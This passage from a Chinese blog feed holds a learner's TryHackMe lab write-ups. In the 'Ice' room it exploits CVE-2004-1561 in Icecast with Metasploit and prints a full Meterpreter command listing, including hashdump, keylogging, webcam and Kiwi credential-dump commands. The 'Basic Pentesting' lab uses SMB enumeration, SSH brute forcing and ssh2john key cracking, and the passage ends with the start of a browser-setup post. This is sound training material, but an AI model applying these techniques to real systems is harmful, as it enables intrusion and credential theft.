href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810002.png" alt="image-20240320233000195"></p><p>问题一二</p><p><a href="https://www.cvedetails.com/cve/CVE-2004-1561/">CVE-2004-1561：Icecast 2.0.1 及更早版本中的缓冲区溢出允许远程攻击者通过 HTTP 请求执行任意代码 — CVE-2004-1561 : Buffer overflow in Icecast 2.0.1 and earlier allows remote attackers to execute arbitrary code via an HTTP request with (cvedetails.com)</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810663.png" alt="image-20240320234356537"></p><p>就这一个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810587.png" alt="image-20240320234553484"></p><p>显然RHOSTS需要填充数据</p><p>这里还需要注意，监听ip要改为openvpn的ip，也可以在kali使用ifconfig，tun0就是我们的LHOST</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810508.png" alt="image-20240320235047784"></p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810351.png" alt="image-20240320235119524"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810731.png" alt="image-20240320235138552"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810915.png" alt="image-20240320235151857"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810783.png" alt="image-20240320235247853"></p><p>问题一二的答案</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810611.png" alt="image-20240320235339341"></p><p>三四（7601，x64）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810404.png" alt="image-20240320235940490"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811316.png" alt="image-20240321000619999"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811134.png" alt="image-20240321000435164"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811363.png" alt="image-20240321000550128"></p><p>（我这里Lhost打错了，我后面改了就不截图了）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811080.png" alt="image-20240321000901035"></p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>什么时候用run什么时候用exploit，getprivs</p><h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811553.png" alt="image-20240321001220381"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811337.png" alt="image-20240321001242083"></p><p>spoolsv.exe</p><p>这个就是打印机</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811985.png" alt="image-20240321002331346"></p><p>也可以migrate 1260(spoolsv.exe的pid)</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811740.png" alt="image-20240321002444943"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811844.png" alt="image-20240321002515517"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811688.png" alt="image-20240321002556604"></p><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811647.png" alt="image-20240321002644127"></p><h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p><em><strong>Post-Exploitation</strong></em>：主要指攻陷目标网络中的某一台或者多台主机之后需要继续去做的一些事情，包括但不限于–识别已经拿下的主机的价值以及维持访问权限；主机对于攻击者来说是否具有一定的价值、具有多大的价值主要从以下两个方面考虑–一方面在于该主机中是否有敏感信息、数据，另外一方面在于该主机是否能够在后期的渗透中发挥辅助价值-比如被攻陷的主机账户是否属于目标组织中的关键人物、高层领导、系统管理员，被攻陷的主机是否能够尽可能的有目标内网的不同网段的访问权限等等。</p><p><strong>答题</strong></p><p>正如我们在上一小节中所提及的那样-我们可以使用 <code>hashdump</code>命令来转储用户的hash值，然后再进行hash密码破解操作。（我们可以使用<code>help</code>命令，然后从帮助菜单中查看到hashdump的具体用途）</p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175233338-826144842.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811163.png" alt="image"></a></p><p>通过使用<code>help</code>命令并查看帮助菜单，我们得知<code>screenshare</code>命令可用于实时查看远程用户的桌面：</p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175253347-204506380.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811219.png" alt="image"></a></p><p>通过使用<code>help</code>命令并查看帮助菜单，我们得知<code>record_mic</code>命令可用于连接到系统的麦克风录音（下图中的webcams-含义是网络摄像头）：</p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175311759-1873950824.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811829.png" alt="image"></a></p><p>通过使用<code>help</code>命令并查看帮助菜单，我们得知<code>record_mic</code>命令可用于修改系统上文件的时间戳：</p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175329253-710506700.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811209.png" alt="image"></a></p><p>通过使用<code>help</code>命令并查看帮助菜单，我们得知<code>golden_ticket_create</code>命令可用于创建黄金票据：</p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175348463-1858698551.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811543.png" alt="image"></a></p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175406092-1903750654.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811152.png" alt="image"></a></p><blockquote><p>在msf中启用远程桌面 (MSRDP) 模块的命令： run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</p></blockquote><p>这里内容都一样，就直接把别人的复制过来了，参考链接：</p><p><a href="https://www.cnblogs.com/Hekeats-L/p/17212354.html">【THM】Ice-练习 - Hekeatsll - 博客园 (cnblogs.com)</a></p><h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Core Commands</span><br><span class="hljs-section">=============</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    ?             Help menu</span><br><span class="hljs-code">    background    Backgrounds the current session</span><br><span class="hljs-code">    bg            Alias for background</span><br><span class="hljs-code">    bgkill        Kills a background meterpreter script</span><br><span class="hljs-code">    bglist        Lists running background scripts</span><br><span class="hljs-code">    bgrun         Executes a meterpreter script as a background thread</span><br><span class="hljs-code">    channel       Displays information or control active channels</span><br><span class="hljs-code">    close         Closes a channel</span><br><span class="hljs-code">    detach        Detach the meterpreter session (for http/https)</span><br><span class="hljs-code">    disable_unic  Disables encoding of unicode strings</span><br><span class="hljs-code">    ode_encoding</span><br><span class="hljs-code">    enable_unico  Enables encoding of unicode strings</span><br><span class="hljs-code">    de_encoding</span><br><span class="hljs-code">    exit          Terminate the meterpreter session</span><br><span class="hljs-code">    get_timeouts  Get the current session timeout values</span><br><span class="hljs-code">    guid          Get the session GUID</span><br><span class="hljs-code">    help          Help menu</span><br><span class="hljs-code">    info          Displays information about a Post module</span><br><span class="hljs-code">    irb           Open an interactive Ruby shell on the current session</span><br><span class="hljs-code">    load          Load one or more meterpreter extensions</span><br><span class="hljs-code">    machine_id    Get the MSF ID of the machine attached to the session</span><br><span class="hljs-code">    migrate       Migrate the server to another process</span><br><span class="hljs-code">    pivot         Manage pivot listeners</span><br><span class="hljs-code">    pry           Open the Pry debugger on the current session</span><br><span class="hljs-code">    quit          Terminate the meterpreter session</span><br><span class="hljs-code">    read          Reads data from a channel</span><br><span class="hljs-code">    resource      Run the commands stored in a file</span><br><span class="hljs-code">    run           Executes a meterpreter script or Post module</span><br><span class="hljs-code">    secure        (Re)Negotiate TLV packet encryption on the session</span><br><span class="hljs-code">    sessions      Quickly switch to another session</span><br><span class="hljs-code">    set_timeouts  Set the current session timeout values</span><br><span class="hljs-code">    sleep         Force Meterpreter to go quiet, then re-establish session</span><br><span class="hljs-code">    ssl_verify    Modify the SSL certificate verification setting</span><br><span class="hljs-code">    transport     Manage the transport mechanisms</span><br><span class="hljs-code">    use           Deprecated alias for &quot;load&quot;</span><br><span class="hljs-code">    uuid          Get the UUID for the current session</span><br><span class="hljs-code">    write         Writes data to a channel</span><br><br><br><span class="hljs-section">Stdapi: File system Commands</span><br><span class="hljs-section">============================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    cat           Read the contents of a file to the screen</span><br><span class="hljs-code">    cd            Change directory</span><br><span class="hljs-code">    checksum      Retrieve the checksum of a file</span><br><span class="hljs-code">    cp            Copy source to destination</span><br><span class="hljs-code">    del           Delete the specified file</span><br><span class="hljs-code">    dir           List files (alias for ls)</span><br><span class="hljs-code">    download      Download a file or directory</span><br><span class="hljs-code">    edit          Edit a file</span><br><span class="hljs-code">    getlwd        Print local working directory</span><br><span class="hljs-code">    getwd         Print working directory</span><br><span class="hljs-code">    lcat          Read the contents of a local file to the screen</span><br><span class="hljs-code">    lcd           Change local working directory</span><br><span class="hljs-code">    lls           List local files</span><br><span class="hljs-code">    lpwd          Print local working directory</span><br><span class="hljs-code">    ls            List files</span><br><span class="hljs-code">    mkdir         Make directory</span><br><span class="hljs-code">    mv            Move source to destination</span><br><span class="hljs-code">    pwd           Print working directory</span><br><span class="hljs-code">    rm            Delete the specified file</span><br><span class="hljs-code">    rmdir         Remove directory</span><br><span class="hljs-code">    search        Search for files</span><br><span class="hljs-code">    show_mount    List all mount points/logical drives</span><br><span class="hljs-code">    upload        Upload a file or directory</span><br><br><br><span class="hljs-section">Stdapi: Networking Commands</span><br><span class="hljs-section">===========================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    arp           Display the host ARP cache</span><br><span class="hljs-code">    getproxy      Display the current proxy configuration</span><br><span class="hljs-code">    ifconfig      Display interfaces</span><br><span class="hljs-code">    ipconfig      Display interfaces</span><br><span class="hljs-code">    netstat       Display the network connections</span><br><span class="hljs-code">    portfwd       Forward a local port to a remote service</span><br><span class="hljs-code">    resolve       Resolve a set of host names on the target</span><br><span class="hljs-code">    route         View and modify the routing table</span><br><br><br><span class="hljs-section">Stdapi: System Commands</span><br><span class="hljs-section">=======================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    clearev       Clear the event log</span><br><span class="hljs-code">    drop_token    Relinquishes any active impersonation token.</span><br><span class="hljs-code">    execute       Execute a command</span><br><span class="hljs-code">    getenv        Get one or more environment variable values</span><br><span class="hljs-code">    getpid        Get the current process identifier</span><br><span class="hljs-code">    getprivs      Attempt to enable all privileges available to the current process</span><br><span class="hljs-code">    getsid        Get the SID of the user that the server is running as</span><br><span class="hljs-code">    getuid        Get the user that the server is running as</span><br><span class="hljs-code">    kill          Terminate a process</span><br><span class="hljs-code">    localtime     Displays the target system local date and time</span><br><span class="hljs-code">    pgrep         Filter processes by name</span><br><span class="hljs-code">    pkill         Terminate processes by name</span><br><span class="hljs-code">    ps            List running processes</span><br><span class="hljs-code">    reboot        Reboots the remote computer</span><br><span class="hljs-code">    reg           Modify and interact with the remote registry</span><br><span class="hljs-code">    rev2self      Calls RevertToSelf() on the remote machine</span><br><span class="hljs-code">    shell         Drop into a system command shell</span><br><span class="hljs-code">    shutdown      Shuts down the remote computer</span><br><span class="hljs-code">    steal_token   Attempts to steal an impersonation token from the target process</span><br><span class="hljs-code">    suspend       Suspends or resumes a list of processes</span><br><span class="hljs-code">    sysinfo       Gets information about the remote system, such as OS</span><br><br><br><span class="hljs-section">Stdapi: User interface Commands</span><br><span class="hljs-section">===============================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    enumdesktops  List all accessible desktops and window stations</span><br><span class="hljs-code">    getdesktop    Get the current meterpreter desktop</span><br><span class="hljs-code">    idletime      Returns the number of seconds the remote user has been idle</span><br><span class="hljs-code">    keyboard_sen  Send keystrokes</span><br><span class="hljs-code">    d</span><br><span class="hljs-code">    keyevent      Send key events</span><br><span class="hljs-code">    keyscan_dump  Dump the keystroke buffer</span><br><span class="hljs-code">    keyscan_star  Start capturing keystrokes</span><br><span class="hljs-code">    t</span><br><span class="hljs-code">    keyscan_stop  Stop capturing keystrokes</span><br><span class="hljs-code">    mouse         Send mouse events</span><br><span class="hljs-code">    screenshare   Watch the remote user desktop in real time</span><br><span class="hljs-code">    screenshot    Grab a screenshot of the interactive desktop</span><br><span class="hljs-code">    setdesktop    Change the meterpreters current desktop</span><br><span class="hljs-code">    uictl         Control some of the user interface components</span><br><br><br><span class="hljs-section">Stdapi: Webcam Commands</span><br><span class="hljs-section">=======================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    record_mic    Record audio from the default microphone for X seconds</span><br><span class="hljs-code">    webcam_chat   Start a video chat</span><br><span class="hljs-code">    webcam_list   List webcams</span><br><span class="hljs-code">    webcam_snap   Take a snapshot from the specified webcam</span><br><span class="hljs-code">    webcam_strea  Play a video stream from the specified webcam</span><br><span class="hljs-code">    m</span><br><br><br><span class="hljs-section">Stdapi: Audio Output Commands</span><br><span class="hljs-section">=============================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    play          play a waveform audio file (.wav) on the target system</span><br><br><br><span class="hljs-section">Priv: Elevate Commands</span><br><span class="hljs-section">======================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    getsystem     Attempt to elevate your privilege to that of local system.</span><br><br><br><span class="hljs-section">Priv: Password database Commands</span><br><span class="hljs-section">================================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    hashdump      Dumps the contents of the SAM database</span><br><br><br><span class="hljs-section">Priv: Timestomp Commands</span><br><span class="hljs-section">========================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    timestomp     Manipulate file MACE attributes</span><br><br><br><span class="hljs-section">Kiwi Commands</span><br><span class="hljs-section">=============</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    creds_all     Retrieve all credentials (parsed)</span><br><span class="hljs-code">    creds_kerber  Retrieve Kerberos creds (parsed)</span><br><span class="hljs-code">    os</span><br><span class="hljs-code">    creds_livess  Retrieve Live SSP creds</span><br><span class="hljs-code">    p</span><br><span class="hljs-code">    creds_msv     Retrieve LM/NTLM creds (parsed)</span><br><span class="hljs-code">    creds_ssp     Retrieve SSP creds</span><br><span class="hljs-code">    creds_tspkg   Retrieve TsPkg creds (parsed)</span><br><span class="hljs-code">    creds_wdiges  Retrieve WDigest creds (parsed)</span><br><span class="hljs-code">    t</span><br><span class="hljs-code">    dcsync        Retrieve user account information via DCSync (unparsed)</span><br><span class="hljs-code">    dcsync_ntlm   Retrieve user account NTLM hash, SID and RID via DCSync</span><br><span class="hljs-code">    golden_ticke  Create a golden kerberos ticket</span><br><span class="hljs-code">    t_create</span><br><span class="hljs-code">    kerberos_tic  List all kerberos tickets (unparsed)</span><br><span class="hljs-code">    ket_list</span><br><span class="hljs-code">    kerberos_tic  Purge any in-use kerberos tickets</span><br><span class="hljs-code">    ket_purge</span><br><span class="hljs-code">    kerberos_tic  Use a kerberos ticket</span><br><span class="hljs-code">    ket_use</span><br><span class="hljs-code">    kiwi_cmd      Execute an arbitary mimikatz command (unparsed)</span><br><span class="hljs-code">    lsa_dump_sam  Dump LSA SAM (unparsed)</span><br><span class="hljs-code">    lsa_dump_sec  Dump LSA secrets (unparsed)</span><br><span class="hljs-code">    rets</span><br><span class="hljs-code">    password_cha  Change the password/hash of a user</span><br><span class="hljs-code">    nge</span><br><span class="hljs-code">    wifi_list     List wifi profiles/creds for the current user</span><br><span class="hljs-code">    wifi_list_sh  List shared wifi profiles/creds (requires SYSTEM)</span><br><span class="hljs-code">    ared</span><br><br></code></pre></td></tr></table></figure><h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p><a href="https://www.exploit-db.com/exploits/568">Icecast 2.0.1 (Win32) - Remote Code Execution (1) - Windows remote Exploit (exploit-db.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY3-Basic Pentesting</title>
    <link href="/2024/06/17/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY3-Basic-Pentesting/"/>
    <url>/2024/06/17/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY3-Basic-Pentesting/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY3-Basic-Pentesting"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY3-Basic-Pentesting" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY3-Basic Pentesting"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY3-Basic Pentesting</h1><p><a href="https://tryhackme.com/r/room/basicpentestingjt">TryHackMe的 |基本渗透测试 — TryHackMe | Basic Pentesting</a></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337963.png" alt="image-20240320212602863"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337003.png" alt="image-20240320213259423"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337996.png" alt="image-20240320220300964"></p><p>(扫太慢了，后面补上的)</p><p>左为第二个问题答案，由开放端口判断，右边显示出第三个问题答案，development</p><p>然后我们因为开放了，139，445端口，可以猜想到有之前开放的samba</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337989.png" alt="image-20240320213741009"></p><p>samba连接上之后看到目录上有个staff.txt，十分可疑</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337988.png" alt="image-20240320213848085"></p><p>get命令提取下来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337986.png" alt="image-20240320213914776"></p><p>可以看到一个Jan一个Kay</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337268.png" alt="image-20240320220433310"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337287.png" alt="image-20240320221139258"></p><p>(后来补上的)</p><p>不知道要扫到什么时候，作个小弊，搜到了答案armando</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337302.png" alt="image-20240320220744358"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337319.png" alt="image-20240320221118602"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337339.png" alt="image-20240320221716231"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337352.png" alt="image-20240320222603779"></p><p>找到Kay ssh的密钥</p><p>注意，这里复制一定要一整个都复制下去，不然一会儿ssh2john会无法解析文件</p><p>然后就创建一个文件，大多教程可能会采用nano，事实上都可以（手动创建个文件也行），我这里采用了vim</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337486.png" alt="image-20240320230143875"></p><p>大致流程这样既可</p><p>然后就是对hash值的破解</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337546.png" alt="image-20240320230333319"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337596.png" alt="image-20240320230624198"></p><p>这里记得chmod 600</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337655.png" alt="image-20240320230736259"></p><p>拿下最后的答案</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337683.png" alt="image-20240320230819789"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一个基础的靶场，开始先通过nmap获取端口信息，然后通过samba连接上目标，并获取关键文件，这些都是老知识，比较新的是ssh连接，例如对rsa的破解，ssh连接的一些小细节</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>挖洞前置-环境配置</title>
    <link href="/2024/06/17/%E6%8C%96%E6%B4%9E%E5%89%8D%E7%BD%AE-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/06/17/%E6%8C%96%E6%B4%9E%E5%89%8D%E7%BD%AE-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置（如果我记得住且不懒的话持续更新）"><a href="#环境配置（如果我记得住且不懒的话持续更新）" class="headerlink" title="环境配置（如果我记得住且不懒的话持续更新）"></a>环境配置（如果我记得住且不懒的话持续更新）</h1><h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><p>做web端的渗透测试，我们首先就要有一个好的浏览器，这里我推荐使用Firefox和Google，这里的建议是两个都配一配，一个不行就换另一个，这篇文章我将从google的角度进行配置，firefox大体相通，如果真的不想配很多很繁琐的，我这里也先直接推荐一个配好的版本</p><p><a href="https://mp.weixin.qq.com/s/AFwq_sLsMR0GcFABI__isg">渗透测试专用firefox浏览器 v2024.2最新版！！！ (qq.com)</a></p><p>下面正式开始</p><p>首先是一个插件下载网站，如果不懂得科学上网，我们的插件可以从这里下载</p><p><a href="https://www.crxsoso.com/">https://www.crxsoso.com/</a></p><p>下面这个是google扩展程序官网（<strong>需要魔法！</strong>）</p><p><a href="https://chromewebstore.google.com/category/extensions?utm_source=ext_sidebar&hl=zh-CN">https://chromewebstore.google.com/category/extensions?utm_source=ext_sidebar&amp;hl=zh-CN</a></p><p>先说说推荐哪些插件：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181048442.png" alt="image-20240618104842398"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181052867.png" alt="image-20240618105255056"></p><p>这个工具可以让我们很轻易地就能对资产做一些简单的信息收集，我们还能自己给它添加上fofa,hunter等的key</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181048654.png" alt="image-20240618104855611"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181053190.png" alt="image-20240618105334124"></p><p>这个用于快捷的有没有api接口泄露</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181049688.png" alt="image-20240618104914665"></p><p>熟知ctf的对这个应该都不会陌生</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181049625.png" alt="image-20240618104926586"></p><p>这个对于后续抓包非常重要，是用来调代理的</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181049082.png" 